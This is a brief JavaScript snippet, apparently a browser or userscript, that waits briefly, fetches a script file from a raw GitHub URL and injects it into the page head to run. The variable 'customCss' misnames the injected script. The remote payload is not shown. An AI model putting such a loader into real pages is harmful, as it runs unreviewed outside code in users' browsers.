setTimeout(() => {
    fetch("https://raw.githubusercontent.com/Alex-Octocorn/logo/main/style.js")
        .then(script => script.text())
        .then((script) => {
                const head = document.querySelector('head');
                const customCss = document.createElement('script');
                customCss.type = 'text/javascript';
                customCss.appendChild(document.createTextNode(script));
                head.appendChild(customCss);
            }
        )
})
